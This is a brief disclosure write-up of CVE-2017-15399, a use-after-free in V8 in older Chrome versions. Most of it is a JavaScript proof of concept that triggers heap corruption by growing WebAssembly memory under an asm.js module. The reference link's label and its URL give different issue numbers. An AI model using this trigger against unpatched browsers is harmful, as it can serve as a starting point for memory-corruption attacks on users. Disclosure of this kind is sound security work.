# CVE-2017-15399
* Date : October 2017
* Credit :Zhao Qixun (Qihoo 360 Vulcan Team)

## Description
A use after free in V8 in Google Chrome prior to 62.0.3202.89 allowed a remote attacker to potentially exploit heap corruption via a crafted HTML page.

## PoC
```js
/**
	author:Qixun Zhao Of Qihoo 360 Vulcan Team
	twitter:@S0rryMybad
	weibo:http://weibo.com/babyboaes
***/

function module(stdlib,foreign,buffer){
	"use asm";
	var fl = new stdlib.Uint32Array(buffer);
	function f1(x){
		x = x | 0;
		fl[0] = x;
		fl[0x10000] = x;
		fl[0x100000] = x;
	}
	return f1;
}

var global = {Uint32Array:Uint32Array};
var env = {};
memory = new WebAssembly.Memory({initial:200});
var buffer = memory.buffer;
evil_f = module(global,env,buffer);

zz = {};
zz.toString = function(){
	alert(1);
	Array.prototype.slice.call([]);
	return 0xffffffff;
}
evil_f(3);
memory.grow(1);
evil_f(zz);
```

## Reference

[issue 941743](https://bugs.chromium.org/p/chromium/issues/detail?id=776677)